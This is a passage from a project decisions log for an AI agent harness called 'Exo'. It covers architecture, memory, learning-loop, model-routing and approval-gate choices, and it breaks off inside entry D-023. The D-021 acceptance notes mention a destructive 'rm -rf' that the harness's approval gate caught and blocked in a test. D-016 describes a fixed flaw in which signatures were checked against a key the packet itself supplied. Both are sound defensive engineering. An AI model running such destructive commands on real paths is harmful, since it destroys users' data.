# DECISIONS

Each significant choice: what, why, what was rejected. Newest last. A reads along and redirects.
Format: `D-NNN (date) title` then Decision / Why / Rejected / Revisit if. An entry still waiting for the principal's
ruling carries Status, Why, Proposal, Rejected and Open instead, and takes Decision and Revisit if once it is ruled.

## D-001 (2026-10-11) Work lives in this repo; phases leave handoffs
- **Decision:** All Exo planning and code lives in `aska-digital/exo` (private). Each phase ends with a
  handoff in `~/Work/handoffs/exo-phase-N.md` and a commit.
- **Why:** A asked for work that survives compaction and session switches.
- **Rejected:** Keeping plans in agent memory or the Drive vault (lost on compaction; slow sync).

## D-002 (2026-10-11) Research and inventory run as parallel subagents writing to files
- **Decision:** Five subagents: guardian-angel crawl, GitHub inventory, local ~/.hermes inventory,
  local documents and exports inventory, base evaluation. Each writes one file in `research/` or
  an inventory folder (kept outside the repo, see D-042) and returns a short summary.
- **Why:** A asked to keep the lead session lean; the four tasks are independent.
- **Rejected:** One long crawl in the lead session (context cost); protean lanes for the crawl
  (their small models handle one mechanical task well, not open-ended judgment-heavy reading).

## D-003 (2026-10-11) hafiz is an input, not a side project
- **Decision:** `~/hafiz` (the principal knowledge base built earlier today) is treated as Exo's
  memory seed and its method as Exo's ingestion pipeline v0.
- **Why:** It already implements the guardian-angel record, router, provenance and training seeds.
- **Rejected:** Starting the memory model from scratch.

## D-004 (2026-10-11) Two goals held together: fit one person, replicate for anyone
- **Decision:** Every component separates the **mechanism** (generic, shipped in the repo) from the
  **principal** (one person's data, profile, tuning, rules, kept in a per-user store). A is principal #1.
  Nothing in the core may assume A's accounts, machines, agents or names; everything about A lives in
  his principal store (seeded from `~/hafiz`). A new user gets the same mechanism and an onboarding
  flow that builds their own store.
- **Why:** A: "there's two key aspects to this task, building it to fit me as well as possible and
  making it replicable for any user."
- **Test:** a fresh install with an empty principal store must run end to end; A's install must lose
  nothing when the core updates.
- **Rejected:** Building for A first and generalizing later (A-specific assumptions leak into core and
  are expensive to remove). Building generic first (loses the fit, which is the point of a guardian angel).

## D-005 (2026-10-11) Base: Hermes Agent as a distribution, not a hard fork
- **Decision:** Exo runs on upstream Hermes Agent pinned to weekly release tags. All Exo features ship
  as Hermes plugins plus a separate `exo` Python package (this repo). A patch queue of at most 5 core
  patches is allowed, and each must also be an open upstream PR; a patch is dropped when it merges or
  when a hook replaces it.
- **Why:** Evidence in `research/BASE-EVAL.md`. Hermes already covers gateways, cron, kanban,
  delegation, memory and context-engine plugin points, TUI, desktop and 40 providers (score 81, best).
  Upstream moves about 490 commits a day; A's open core PRs sit on files touched 86 to 170 times a month,
  while the plugin contract files change 5 to 9 times a month. All 4 of A's merged PRs were plugin-only;
  13 of 20 closed PRs were core-only. Plugin work lands; core work mostly does not. A already runs this
  way (vanilla checkout plus 8 external plugins).
- **This changes A's brief.** A leaned toward a fork that merges everything natively. "Native" here
  means first-class Exo plugins installed by the Exo installer, not edits to Hermes core. The user sees
  one system; the code stays rebasable.
- **Replicability (D-004):** one installer gives any user upstream Hermes plus Exo; personal data lives
  in a separate store.
- **Rejected:** hard fork (73: rebase lane forever on the hottest files); OpenClaw (72: strong gateways
  and phone apps but no investment, TypeScript, OpenAI-sponsored foundation; borrow ideas); OpenCode,
  pi, Goose, Codex (good engines, no personal-system layer; use as workers via ACP/MCP); Letta Code
  (best memory design, cloud-first; copy its ideas); fresh on Claude Agent SDK (54: Claude-only,
  proprietary TS SDK, no subscription login for third parties).
- **Revisit if:** Nous relicenses, or breaks the plugin API repeatedly, or a needed hook is refused
  upstream twice. Then freeze at the last good tag and fork from there (MIT allows it).

## D-006 (2026-10-11) Principles v1 adopted; three tensions resolved
- **Decision:** `research/PRINCIPLES.md` (18 principles from a 69-page crawl of gwern's guardian-angel
  essay and its links) is the design charter. Tensions: (1) cost: spend on compounding work under a
  ceiling A sets, frugal on routine calls; (2) local-first log and store, compute wherever cheapest and
  verifiable; (3) learn at the memory and prompt layer in v1, log training-ready for adapters later.
- **Why:** These keep A's rulings (frugality, model choice is his, local machines) while keeping gwern's
  core loop (log, ask-when-uncertain, corrections that stick, n=1 evaluation).
- **Rejected:** gwern's "$1,000+ a month" default spend (conflicts with A's budget rule); dynamic
  evaluation on open weights as v1 (A's stack is frontier APIs today); passive lifelogging as the main
  data source (low information per byte).

## D-007 (2026-10-11) Inventory ratified: 137 items, verdicts and open questions
- **Decision:** The inventory verdicts (kept outside the repo, see D-042) stand (core 18, plugin 13, skill 18, patch 5, upstream 9,
  data 28, reference 11, retire 10, drop 25), with these rulings on its open questions:
  - **Memory:** Hermes runs one active memory provider, so **optchat-memory becomes the episodic base of
    `exo-memory`** (its verbatim daily log and summary tree), not a separate plugin. exo-memory adds the
    principal pack, ledger capture, belief retrieval and correction capture on top. cognition-memory retires.
  - **Taste learning (#126940):** rebuilt in `exo.consolidate` and the principal store, not carried as a patch.
  - **Shared auth across profiles:** no. Per-profile auth as upstream ruled; a per-principal credential broker
    in exo later if needed.
  - **Single source of skills:** the Exo skill pack. protean-team-skills content moves into exo; its ops
    ledgers move to A's principal store as data.
  - **SYM-2P and Divan Bus:** layered. Bus = signed envelope (`exo.bus`); SYM-2P = optional body for
    agent-to-agent briefs and receipts (`exo.protocols.sym2p`). Anything shown to a person renders in plain English.
  - **ordopilot courier** becomes `exo.intake`; ordaprompt stays the front-door router plugin.
  - **Raptora** retires; its hiatus rule ("stale is not abandoned") moves into `exo.attention`.
  - **Patch queue:** #119652, #98901, #107130, #110011, plus a new upstream PR for an auxiliary routing hook.
- **Done now (reversible, local):** salvaged muse-bridge (untracked), the unpushed quota-governor commits
  (git bundle) and the ordaprompt workspace (bundle) into `~/Work/exo-salvage-20261011/`; froze the
  Team6-era Hermes state DBs from the iCloud backup into A's private corpus.
- **Left for A (irreversible or outward):** deleting the 32 GB quarantine; pruning ~70 stale branches on
  the forks; archiving protean-team and aska-digital/hermes-agent; disabling raptora's cron; confirming
  who uses the Linux seat's GitHub account. Batched in the phase report.
- **Rejected:** carrying all 25 open core PRs (rebase cost, D-005); running optchat and exo-memory side by
  side (one provider slot); keeping protean-team-skills as a second source (drift).

## D-008 (2026-10-11) Build in waves of parallel agents with disjoint ownership
- **Decision:** Phase 4 runs in waves. Wave 1 (done): core package, 40 tests. Wave 2 (running): exo-command,
  Hermes pin + patch queue + contract tests, exo-memory (+ `exo.capture`), exo-context (+ `exo.handoff`),
  exo-gate (+ `exo.gate`), ingest adapters. Each agent owns disjoint paths and does not commit; the lead
  reviews, runs the full suite, commits and pushes. Wave 3: consolidate (taste and beliefs), ask loop,
  n=1 eval, exo.bus (Divan Bus port), exo-orchestra (Protean template and skill pack), installer and
  `exo init` interview, then migration stage M0 on a canary profile.
- **Why:** keeps the lead's context lean (A's instruction) and avoids git races between agents.
- **Rejected:** one agent per plugin committing directly (index-lock races, unreviewed commits); building
  plugins before the core API existed (rework).

## D-009 (2026-10-12) A's redirect: Exo is a standalone harness; Hermes is a source, not a dependency
- **Ruling (A, verbatim in `~/hafiz/nodes/work/exo.md`):** "I also dont want hermes to be a dependency.
  whenever hermes updates progress significantly or there's a meaningful improvement, fix, etc. we can
  rebase the appropriate parts of our system but I dont want a persistent lie that limits our ability to
  iterate and evolve. this will eventually be its own standalone harness so lets make it that way."
- **Supersedes D-005.** The plugin-and-patch-queue approach is retired as the end state. What was built on
  Hermes plugin contracts (exo-memory, exo-context, exo-gate, exo-command, exo-bus, exo-orchestra) is kept
  as logic and re-homed onto Exo's own core. The 0005 aux-routing PR is withdrawn: Exo owns its routing.
- **Also set by A in the same note:**
  - **UI:** the simplicity of opencode and Command Code, the robustness and customizability of Hermes.
  - **Learning loop:** fuse Hermes's branch-off review loop (memory and skill learning) with Command
    Code's branch-off taste learning into one feedback loop that aligns the harness to its user.
  - **Hill-climbing eval (mid-turn addition):** "i also want to bake in some kind of hill-climbing/eval
    system that strengthens the alignment feedback loop further." The loop climbs against a per-user eval;
    a lesson is promoted only if it scores better on held-out cases.
  - **Store:** hafiz's design becomes the store design, merged with Arif (external-data ingest) and
    Eldunari (router, anima, nexus). Their useful parts come in; their structures move to the new format.
  - **Horizon:** a portable companion device (mini robot or a Muse-charm-like object) in a few years.
    Design for this now: a portable principal store, a small-model path, local-first.
- **Next:** research (UI, learning loops, standalone core, store merge) in parallel, then D-010 sets how
  the standalone core is built and how Hermes improvements are pulled in.
- **Rejected:** keeping Hermes as a pinned runtime dependency (A's ruling); a full rewrite from zero
  before the research says what to lift (wastes the 2026 work in Hermes).

## D-010 (2026-10-12) Standalone core: lean Python core, lifted Hermes parts, protocol-first UI
- **Decision:** Exo gets its own core in Python, in this repo. It lifts a small set of Hermes modules
  (memory and context slot interfaces, provider message types and two transports, selected built-in tool
  logic, compressor prompts, and later individual platform adapters) and rewrites the loop, routing,
  tools registry, sessions, plugins, skills, cron and delegation small. It drops the gateway framework,
  TUI gateway, dashboard and desktop. The core runs as `exod`, a server with one typed, replayable event
  stream; TUI, web, desktop, chat channels and a future device are clients. Each lifted or ported module
  is recorded in `PROVENANCE.toml` with its upstream path and commit; `exo upstream` diffs upstream
  weekly and proposes ports, and `commit` moves only after a port or a recorded refusal. Hermes's MIT
  notice ships in `LICENSES/`. The six Exo plugins keep the `plugin.yaml` + `register(ctx)` shape and move
  over with import changes. Build in five waves (`docs/STANDALONE.md` section 6); wave 1 is the core
  skeleton. A's live Hermes runs untouched until each seat cuts over in wave 4.
- **Why:** A's ruling (D-009): no runtime dependency, freedom to evolve, improvements pulled in on
  purpose. Scored 83 against 60 for a hard fork, 60 for a TypeScript core and 47 for the Claude Agent SDK
  (`docs/STANDALONE.md` section 2). Exo's 12k-line package and 509 tests are Python and keep working.
  Exo's plugins touch Hermes at only 20 import sites, so re-homing is cheap. The slot interfaces Exo
  needs are 456 lines with almost no dependencies, while the rest of Hermes is about 926k lines with
  `agent/` and `tools/` importing the CLI in 259 files. A lean core with a line budget and a small
  protocol is the only option that can shrink onto a companion device. A protocol-first split gives
  opencode-style UI simplicity without tying the core to any one client.
- **Rejected:** detached hard fork (owns 926k lines and a 257-method TUI gateway; merges stop working
  within weeks; cannot shrink to a device); TypeScript core (rewrites Exo's package and tests; Hermes ports
  become translations; its UI benefit is available through the protocol anyway); Claude Agent SDK core
  (Claude only, closed runtime, no small-model path); keeping Hermes pinned as a runtime (A's ruling);
  a rewrite with no lifting (throws away Hermes's edge-case fixes and A's 2026 work).
- **Revisit if:** the lean core misses its wave 1 exit test by more than two waves of effort, or Hermes
  splits out a small, dependency-free core library that Exo could depend on without inheriting the rest.
- **Amendment 2026-10-21 (#264, W1-6):** exod's HTTP transport answers a bad number in a request with 400 and a
  JSON `{"error": ...}` body. `Content-Length`, the `since` query value and `Last-Event-ID` must be ASCII digits
  up to 2^63 - 1, SQLite's largest integer and so the durable event log's bound. Leading zeros are allowed. A
  bare `int()` read them and the client handler swallowed its `ValueError`, so a word or a float in any of them
  got no reply, and so did a negative length, which reached `readexactly`. A negative `since` replayed from the
  start. A `since` past the bound sent the stream's 200 header, then failed in the replay and left its
  subscription in the hub. A length over 8 MB is still 413 up to the bound, and a 400 past it. The
  `events.subscribe` command keeps its typed `internal` reply for such a `since`: `GET /events` has no reply
  envelope, so the bound is checked before the stream opens. A malformed request line still closes the
  connection with no reply.
- **Amendment 2026-10-27 (exo-desktop #14, orda-aska; fork issue 2):** a failed core start no longer fails every
  later command. The core starts its runtime once, at the first command: the provider readiness probe
  (`_main_status`, run when no main role is configured), then the MCP servers. When that start raised, the engine
  kept the failed task, and every later command awaited it again and got the same `internal` error until exod
  restarted. A cancelled start task raised `CancelledError` the same way. Now a start task that raised or was
  cancelled is cleared, and the next command starts again. Every command waiting on the failed start gets its
  error, and commands that retry at the same time share one new start. A command cancelled while it waits leaves
  a running start in place, so the runtime never starts twice. An MCP server that fails is still recorded in
  `status()` and skipped, and `peers.start()` runs before the start task exists, so neither fails the start. The
  steps that run again on a retry are guarded: `jobs.recover` returns after its first run, `PeerService.start`
  once its node is set, `Scheduler.start` once its loop runs. A start cut short inside the MCP step can leave
  server tasks running, so `McpManager.start` first stops the servers it already holds, and engine close
  always closes MCP (it skipped that when no start task was kept). Core: 15,839 counted lines, 7 more than main
  cd371aed; D-083 has no line ceiling, and the import and private-read caps are unchanged. Tests:
  `tests/integration/test_engine_start_retry.py`.
- **Amendment 2026-10-29 (exo-desktop #2, follow-up to #726):** the next command clears a failed start before it
  waits. The 2026-10-27 change cleared a start that raised or was cancelled only in a command that was waiting on
  it. When the only waiting command was cancelled and the start then failed, no command cleared it. The next
  command got that old error once more, and only the command after that started again. Now `start()` first drops
  a finished start task that raised or was cancelled, then starts again. A start that is still running stays, so a
  cancelled command still never causes a second start, and every command that waits on a failed start still gets
  its error. Core: 15,940 counted lines, 5 fewer than main 080e87ba (the check replaces the 8-line try block).
  Tests: `tests/integration/test_engine_start_retry.py`.

## D-011 (2026-10-12) Store v2: hafiz format absorbs Arif and Eldunari
- **Decision:** adopt `docs/STORE-V2.md`. One format, three kinds of store: person (hafiz), agent (Eldunari
  anima), group (Eldunari nexus); agent and group stores nest inside the person's store so one folder can
  move to a device. Layers: profile, router, typed nodes, external items (Arif, Postgres to one SQLite
  file), signed ledger (plus Orda revision checks, seat leases, projections), derived indexes. Retrieval:
  router pins, BM25 plus embeddings merged, graph expansion, token budget. Migration runs on copies only;
  Eldunari history kept via `git filter-repo` plus merge.
- **Calls made by the lead (reversible, within standing approvals):** embeddings run locally with
  EmbeddingGemma 300M (Qwen3-Embedding 0.6B is the fallback); Arif's remote embedding calls stop. Mail is
  not re-ingested for now (it was deleted from Arif's DB; the mailbox file stays untouched). Backup is
  local only until A rules on a private remote.
- **Rejected:** keeping Arif in Postgres (cannot travel to a device); three separate stores per person
  (drift); remote embeddings (personal text leaves the machine).
- **Amendment 2026-10-21 (#254):** until the FTS5 and embedding stages are built, retrieval is the in-memory BM25 of
  `store.find`. It rebuilt its tables from every node on each call. It now keeps them with the node set they were
  built from and builds them again when a reload makes a new set (a refresh that sees a change reloads). Holding the
  set itself is the reload generation: a separate counter, read apart from the set, could pair an old set with a new
  number when two threads share a store. Rejected: building the tables in `reload()`, which would tokenize stores that
  are never searched. Also rejected: moving to FTS5 now, which is stage 3 of `docs/STORE-V2.md` and a larger change.
  Scores and order are unchanged. Docs: `docs/CORE.md` "Find".

## D-012 (2026-10-12) One learning loop: review, taste and hill-climbing eval
- **Decision:** adopt `research/LEARNING-LOOP.md` as `exo.learn`. One background reviewer that only
  proposes. Signals: corrections, edits, accepts, rejections, explicit asks, outcomes. Outputs: beliefs,
  taste rules, skills, memory, open questions. Every lesson is a typed proposal with confidence and evidence
  links; reverts append, never delete. A change is promoted only if it beats the current setup on a
  held-out per-user eval and passes regression gates (builds on `src/exo/eval.py`). Every step has a
  small-model or rules-only fallback. Learned taste shows inline in the chat with a link to the editable
  file (Command Code pattern, `research/UI.md`).
- **Calls made by the lead:** unguarded taste auto-promotes after evidence from two separate sessions,
  shown in the brief and reversible; taste syncs between A's machines only through the signed store.
  *Amendment 2026-10-18 (PR #219):* evidence that is all imported history (`exo ingest` rows) does not
  auto-promote under rule 4. The principal reviews that first batch, as `docs/ARCHITECTURE.md` section 5 says.
  Imported evidence is dated by its source time, and superseded rows (an edited ChatGPT prompt's older
  versions, inactive Hermes rows) do not count for the rule of three.
  *Amendment 2026-10-21 (issue #263):* the chat capture after each turn no longer reads the whole ledger to find the
  capture keys already written. The learner keeps them, with the last row it read, and reads only the rows after it.
  The result is the same as a full read of any ledger `exo log verify` passes: the ledger is append-only and nothing
  takes a key back. A ledger that no longer holds that row in its place is read again from the first row. With 10,000
  captured rows in the ledger, each turn's capture took about 70 ms. Now the first turn after a start takes that once,
  and each later turn under 1 ms.
  *Amendment 2026-10-28 (exo-desktop #54):* no client asks a `belief_conflict` question yet, so an answer cannot
  release a held conflict proposal in normal use. A direct `exo proposals accept` or `reject` is how it ends, and it
  now records the question id, which closes the question. A hand-written `answer` that refs the question still
  works. Putting the question in the ask queue is a follow-up.
- **Waiting on A (spend and model choice):** monthly ceiling for the nightly eval and climb; the judge
  model.
- **Rejected:** Hermes-style direct edits by the reviewer (no check that a lesson helps); Command Code
  style save-without-eval (same); keeping taste separate from memory and skills (the gap in PR #126940).
- **Amendment 2026-10-27 (exo-desktop #35 by orda-aska, ported to exo with the follow-up from abu-aska's review
  there):** a lesson is a climb candidate only when its computed evidence weight (`taste.label` of the noisy-or
  weight, decayed to now) is medium or high; the stored `confidence` no longer decides, so a lesson whose evidence
  has decayed stops being a candidate. Every rule reaches every domain, so the held-out gate covers them all, in two
  parts: the candidate's own domains' held-out items (its domain and `general`) and the pinned items, from any
  domain, are gated together as one pool exactly as before, and each other domain's held-out items are gated on
  their own (`held_tolerance` 0.0 per domain, plus the rule, guarded-domain and domain-drop checks). Pooling every
  domain into one held-out check would let a gain in one domain pay for a loss in another: with 15 mind and 10 work
  held-out items, a candidate that broke one mind item while one work item flipped up passed it. Inside the own
  pool a gain on one item can still offset a loss on another, as before. An accepted candidate rescores every dev,
  held-out and pinned item, so the cache and the night's composite are its own scores everywhere; when the call
  budget runs out first, the merged rows are cached under a key no night matches. Cost: a 120-item night with one
  accepted candidate made 256 calls, 173 before (+48%).
- **Amendment 2026-10-28 (#770, exo-desktop #54):** agreeing signals reinforce only active beliefs. Evidence
  agreeing with a rejected belief creates a separate proposal for review, leaving the earlier rejection intact.
- **Amendment 2026-10-29 (#861):** the 2026-10-28 amendment covers corrections and rulings, and reviewer taste and
  fact lessons (`propose_typed`). The match that chooses between reinforcing, the conflict rule and a new proposal
  reads active beliefs only (proposed, held, accepted), so a rejected belief that matches better no longer hides an
  active one:
  a ruling that contradicts an accepted belief goes through the conflict rule (a held proposal and a question when
  that belief is guarded), and one that agrees with an open proposal reinforces it. A reviewer taste or fact lesson
  whose evidence is all held already by the rejected beliefs it agrees with, alone or together, teaches nothing
  again: it is not proposed, raises no conflict question and reinforces no other belief, since the principal
  already ruled on that evidence. A reviewer skill lesson is not checked and is proposed as before. New evidence,
  alone or beside the rejected evidence, is matched as usual. The rule of three still counts a rejected belief
  that agrees as known, so repeating an instruction in chat does not re-raise a rejected lesson; a new correction
  or ruling does. "For review" means the usual promotion rules: an unguarded, ungated new proposal that cites a
  ruling is promoted at once by rule 1 (rule 5 runs first for a gated lesson), and one held on a conflict stays
  held (rule 3).

## D-013 (2026-10-12) Fuse UniiChat's context model into the core loop
- **Decision:** adopt the top picks in `research/UNIICHAT.md` (A's install, built on the same idea as
  optchat-memory). The wave 1 loop builds each turn as a fresh model call from the summary tree plus the
  recent verbatim tail, waits for pending summaries before a turn, and summarizes in parallel with separate
  queues for live chat and imports. Per-agent logs, history import and a `/goal` judge go to waves 2 and 3.
- **Licence:** the shipped UniiChat code's licence is not verified, so Exo reimplements ideas and copies no
  code or prompt text from it until the licence is known.
- **Rejected:** recall as an add-on to a growing transcript (the Hermes model; it degrades on long sessions).

## D-014 (2026-10-12) One surface: terminal feel, app power summoned by the model
- **A's idea (verbatim in `~/hafiz/nodes/work/exo.md`):** "the core typing and chat area feels just like a
  terminal but all the extra ui elements can be intelligently pulled up by the model when
  appropriate/relevant."
- **Decision:** Exo ships one surface, not a CLI and a separate app. The base is a terminal-like prompt and
  transcript (opencode / Command Code simplicity: `/` `@` `!`, one palette). Richer elements (diff viewer,
  task board, approval card, taste card, session tree, charts, file preview) are panels the model opens
  with a `ui` tool, which emits a `ui.panel` protocol event; every client renders what it can (the web and
  desktop clients render full panels; the terminal renders a compact form or a link; a device renders a
  card or voice). The user can always open or dismiss a panel by hand, and panel choices feed the learning
  loop (an ignored panel teaches as much as an opened one). Deciding when to show a panel is a
  decision-model job (D-015).
- **Build:** the `ui.panel` event and `ui` tool land in wave 3 with the clients. Wave 1's protocol stays as is.
- **Rejected:** separate CLI and app products (two UIs to learn, the norm we want to beat); an app that shows
  every panel at all times (Hermes-style clutter).

## D-015 (2026-10-12) Decision models: a `decision` role, local Laya by default, a custom exo-decide later
- **Decision:** adopt `research/DECISION-MODELS.md`. Picking a tool, panel, model or label, gating, and
  the learning loop's classifications go to a `decision` role in the router. Users choose the provider:
  local Laya (default, free, private), TypeSafe Jev, Perplexity pplx-decider, or OpenAI Decisions.
  Decision models return probabilities, not text, so a generative model still writes tool arguments.
  Every decision is logged to the ledger so the learning loop and eval can score it. A decision model may
  make a gate stricter, never looser. Exo will ship a fine-tuned Laya ("exo-decide", Apache 2.0 allows it),
  trained on users' own verdicts, rules and open-weight teachers. Never on Jev or OpenAI outputs: their
  terms forbid training other models on them.
- **Calls made by the lead (reversible):** local Laya is the default for every user; no rented GPU and no
  Claude-written training data until a terms check and a free-path measurement; exo-decide weights stay
  private until they beat base Laya and Jev on the generic held-out set.
- **Waiting on A (spend, model choice, publishing):** the decision provider for his own seats; a monthly
  cap for decision API keys (at current prices 10k decisions a day cost under $1); later, whether to
  publish exo-decide on Hugging Face under aska-digital.
- **Rejected:** a frontier model for every small decision (cost, latency); Jev as exo-decide's teacher
  (terms); Perplexity's 27B open model as the shipped default (needs about 49 GB of GPU memory, no device path).

## D-016 (2026-10-12) Agent wire: SYM-2P lines for machines, English for models and people
- **Amendment 2026-10-27 (exo-desktop #5 and #17, ported in #674):** `exo.wire.verify(line, sig, trusted_pub)`
  checks a detached signature only against the key the caller pins, and returns False when none is given. Before,
  it fell back to the `pub` the signature carries. Whoever made the packet chose that key, so any packet signed by
  any key passed. No production caller used that path, and `delegate`'s receipt test already pinned the key. A
  caller with no pinned key for the signer cannot verify a line. Docs: `docs/AGENT-WIRE.md` §4.2.
- **A's ask:** "project exo should integrate this tech, or a better implementation of its concept, in its
  backend systems for interagent communcation, delegation, and wherever else appropriate/relevant"
  (aska-digital/protean-sym2p).
- **Decision:** adopt docs/AGENT-WIRE.md. Agent records and transport use SYM-2P/2 lines with Exo's
  vocabulary (`exo.wire`): quoted strings, opcodes 100 to 115 under a (100 1) marker, failed and cancelled
  states, typed Brief and Receipt, strict decode with safe-only repair, JSON fallback, negotiation, Ed25519
  signatures, one English renderer. Code writes and reads lines; models and people read only English; no
  model emits a line. First use: the `delegate` tool (`exo.core.agents`) with depth, concurrency, round,
  token and time limits, cancel down the tree, a tasks table and `task.updated` (English in detail, line in
  packet). Bus bodies accept Exo lines. Lessons, decision calls, handoffs and summaries are unchanged.
- **Why:** measured with real tokenizers, lines save bytes (30 to 48% vs JSON) but not model tokens (a
  receipt is 121 o200k tokens as a line, 83 as English, plus a 193-token key). The value is checkability,
  signing and replay. The bigger token win is what a receipt carries: Hermes JSON receipts with tool traces
  cost about 3.5x Exo English.
- **Lead calls:** core line budget test moved from 8k to 15k per STANDALONE.md section 6 (wave 3 target).
- **Rejected:** models reading or writing lines; Hermes JSON receipts; upstream v2 unchanged (no text
  fields); a new format from scratch.
- **Later:** cross-seat delegation over the bus, signed receipts in the ledger, child usage in parent
  totals, locking finished child sessions, async delegation and worktrees, upstream model eval (spend,
  needs A), proposing the additions upstream as v2.2.
- **Revisit if** upstream's model eval shows models do better reading lines.

## D-017 (2026-10-12) Subagents run on the cheapest model that can do the job
- **A's ask:** "you should be putting the subagents on most cost effective models whenever they dont need
  the full power of the model youre on ... encode this into SOPs and also into the exo harness behaviours".
- **Decision:** the router has tier roles `fast`, `standard`, `deep` (fast falls back to standard then
  main; standard and deep fall back to main). The catalog maps them to Haiku 5.5, Sonnet 5.5 and Opus 5.5
  for Anthropic; users override. `delegate` gives each child a tier: scout fast, builder and verifier
  standard, critic deep, or the calling model's own `tier`. A child never runs above its parent's tier
  unless `delegation.allow_upgrade`. A failed child is retried once a tier up unless
  `delegation.escalate_on_fail` is false. Tier and resolved model go in the receipt and `task.updated`.
- **Why:** most delegated work is retrieval and simple implementation; a small model does it well at a
  fraction of the price. Judgment-heavy work keeps its tier; a failure buys one stronger retry.
- **Consequences:** the learning loop can score cost choices per task. A tier with no key, or one that
  resolves to the same model, falls back to main, so local setups behave as before. Wire opcodes 108 and
  116 added; old packets still decode. Tests build engines with `env={}` so a real key in the shell
  never causes spend.
- **Later:** tiers for aux side calls; tier auto-selection from past receipts.

## D-018 (2026-10-12) Provider agnostic; users choose models; default eval and decision models
- **A's rulings:** "exo should be model and provider agnostic"; "users config which models are used. by
  default, the decision model used is laya (locally run) and the evaluation model is same model as what's
  configured and being used in the harness/chat"; "i have a typesafe api as well so we can experiment with
  jev"; the site's repo link stays dead for now.
- **Decision:** every role (main, aux, decision, eval, tiers) is user config. Defaults: `decision` = local
  Laya, `eval` (judge) = the `main` route. Providers added beyond Anthropic: OpenCode Go and Nous Portal
  (A's main providers) and TypeSafe Jev as an opt-in decision provider for experiments. Keys come from
  env, then the OS keychain (service `exo`), then `~/.config/exo/keys.env` (mode 0600); never from chat.
- **Resolves:** the D-012 judge-model question (eval = main) and the decision provider for A's seats
  (Laya default, Jev for experiments). Still open: the eval monthly ceiling and a decision-API cap.

## D-019 (2026-10-12) Jev is the default decision model; Laya is the local fallback
- **A's ruling:** "lets use jev as default instead if laya quality is subpar".
- **Evidence:** base Laya on two probes: "Is deleting a production database reversible?" yes 0.62
  (confidence 0.04); printer-ink receipt filed under taxes 0.46. Jev: no 0.80; office-supplies 0.99.
  Laya's server warns its confidence is uncalibrated.
- **Decision:** default `decision` route = Jev, then local Laya, then aux, then main. The gate consults
  the decision model by default, tighten-only (D-015 unchanged). Amends D-015 and D-018's "local Laya
  default". exo-decide (a fine-tuned Laya) can take the default back only by beating Jev on the held-out
  set; never trained on Jev outputs (terms).

## D-020 (2026-10-12) Exo OS: a new branch of Exo, design first
- **A's ask:** "Exo OS. An OS form of the exo harness that replaces Omarchy entirely with an innovative
  AI-first operating system ... making it the foundation for the user's entire experience and
  interaction with the digital realm". Built by a builder agent on the Linux test machine.
- **Decision:** phase 0 is research and design only (BRIEF-07, folder `os/` on branch
  `exo-os/phase-0`): base system, shell, security, small hardware, roadmap and proposed decisions.
  Exo OS runs the same core and protocol as Exo; no fork.
- **Shared executor interface (2026-10-12):** the core loads a named installed `exo.executors` factory,
  freezes validated post-approval arguments and dispatches through its broker. Required mode refuses missing
  executors, unsupported MCP startup and failed required plugins. The OS supplies isolation and an audited
  trusted plugin inventory; imported Python code remains trusted. See `docs/EXECUTORS.md`.
- **Workspace subprocess closure:** required mode omits host Git handoff facts and uses filesystem-only
  completion, because workspace Git configuration can execute helpers. Cross-seat delegation requires a
  separate broker capability; local child setup passes tools through the shared registry.
- **Required gate audit (2026-10-13):** execution requires committed decision and approval evidence.
  Missing stores/keys, failed audit writes and trusted gate hook exceptions block before the executor.
  Required mode refuses tool-selected body-file host reads, including symlinks; ordinary gate behavior
  remains compatible. See `docs/GATE.md` "Required executor audit".
- **Approval and authority ordering:** pending approvals use unique call tokens separate from reusable
  rule keys. Policy acceptance is audited before pinning; required grant authorization is audited before
  persistence, with an explicit authorization-only record if persistence fails. Separate stores are not
  claimed to activate atomically. Concurrent approvals retain the correct session and decision reference.
- **Ledger authority (2026-10-13):** core writers open the ledger through one factory. With no authority
  configured it is the D-040 local key path unchanged: pinned keys, head anchor, `exo log verify`. With
  `EXO_LEDGER_AUTHORITY` set, an installed backend signs and commits each event and checkpoint before
  replying; verification replays its pinned identity read-only and never falls back to local keys. Enabling
  it on an existing store fails closed (unconfirmed local tail). There is no migration. The separate
  `exo-witness` transport is implemented but disabled by default. It starts only when invoked explicitly.
  No endpoint or receipt-delivery worker is enabled by core startup. Deployment and Exo OS delivery remain separate work. See `docs/LEDGER-AUTHORITY.md`
  and `docs/WITNESS-TRANSPORT.md`.
- **Lead call:** nothing on the Linux test machine's live OS changes in phase 0. It is someone's working machine
  (CRM, messaging, assistants). Where the OS first runs is A's call after the design.

## D-021 (2026-10-12) Wave 2 closed
- **Done:** the six plugins run on the Exo core (no Hermes imports in memory, context, gate, bus,
  command, orchestra); skills loader, MCP client, seats (one canonical format, docs/SEATS.md), `exo web`,
  `exo decide`, config.get/set, seat.list, approvals.list, session status. Root suite 513 passed; plugin
  suites green.
- **Acceptance (STANDALONE.md section 6), live on OpenCode Go (Kimi K3 main, GLM 5.3 Flash aux):** a
  turn-1 correction survived compaction and was quoted verbatim; `rm -rf` on a scratch path raised
  approval.requested and a deny blocked it; bus round trip verified (tests, signed both ways).
- **Open, carried to wave 3:** capture misses corrections phrased as "Important correction ... NOT X";
  the gate has no signing key so decisions are logged, not ledgered; confirm Jev answers gate calls
  live; usage.updated.model reports the configured route, not the one that served after fallback.

## D-022 (2026-10-12) Wave 3 plan: Textual TUI, three protocol adds, learn package
- **TUI stack:** Textual (Python), not a spike first. Reasons: one language and one install with the core,
  stdio boundary, `textual serve` gives a browser mode for free, and the device horizon favours no Node
  runtime (research/UI.md 4.7). The protocol is the boundary, so a TS client can join later. Escape hatch:
  if on the low-power Linux test machine cold start is over 1.5 s or streaming a 2,000-message transcript
  stutters, spike Ink before wave 4.
- **Protocol adds (29 of 30 commands, 22 of 30 events):** `feedback.send` (accept, edit, reject,
  should_have_been: the main learning signal), `ui.respond` (opened, dismissed, acted, ignored), `schedule.edit`
  (cron jobs; a run is a fresh session reported through task.updated), and the `ui.panel` event (D-014;
  every panel carries a plain-text fallback). One command slot is left; new needs add fields, not types.
- **Learning:** a new `exo.learn` package carries the fused loop (research/LEARNING-LOOP.md section 5 and 6):
  capture, typed proposals, promotion policy, revert, and the eval additions. Eval judge = main route (D-018).
  A lesson that changes behaviour (skill patch, high-impact taste) is promoted only if it beats the
  incumbent on held-out cases and passes the regression gates.
- **Ownership and acceptance:** docs/WAVE-3.md.

## D-023 (2026-10-12) Wave 3 built; live acceptance passed; canary next
- **Built (6a82c41):** Textual TUI (`exo tui`), the web UI in exo-command, `exo.learn` (signals, fast loop,
